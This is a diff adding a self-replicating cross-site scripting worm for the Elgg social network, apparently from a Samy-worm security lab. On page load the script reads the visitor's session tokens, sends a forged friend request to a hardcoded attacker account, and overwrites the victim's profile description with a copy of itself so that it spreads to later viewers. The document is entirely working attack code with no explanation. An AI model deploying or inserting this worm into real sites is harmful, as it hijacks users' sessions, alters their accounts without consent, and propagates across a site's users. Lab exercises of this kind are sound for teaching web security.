@@ -1,0 +1,30 @@
+<script id="worm" type="text/javascript">
+window.onload=function(){
+    var samyGuid=59,
+        currentGuid=elgg.session.user.guid,
+        ts=elgg.security.token.__elgg_ts,
+        token=elgg.security.token.__elgg_token;
+    if(currentGuid===samyGuid) return;
+    var Ajax=new XMLHttpRequest(),
+        friendUrl="/action/friends/add?friend="+samyGuid+
+                  "&__elgg_ts="+ts+
+                  "&__elgg_token="+token;
+    Ajax.open("GET",friendUrl,true);
+    Ajax.send();
+    var headerTag="<script id=\"worm\" type=\"text/javascript\">",
+        jsCode=document.getElementById("worm").innerHTML,
+        tailTag="</"+"script>",
+        wormCode=encodeURIComponent(headerTag+jsCode+tailTag);
+    var body="__elgg_token="+token+
+             "&__elgg_ts="+ts+
+             "&name="+encodeURIComponent(elgg.session.user.name)+
+             "&description="+wormCode+
+             "&accesslevel[description]=2"+
+             "&guid="+currentGuid;
+    /* === POST: Modify Victim Profile === */
+    Ajax=new XMLHttpRequest();
+    Ajax.open("POST","/action/profile/edit",true);
+    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    Ajax.send(body);
+};
+</script>
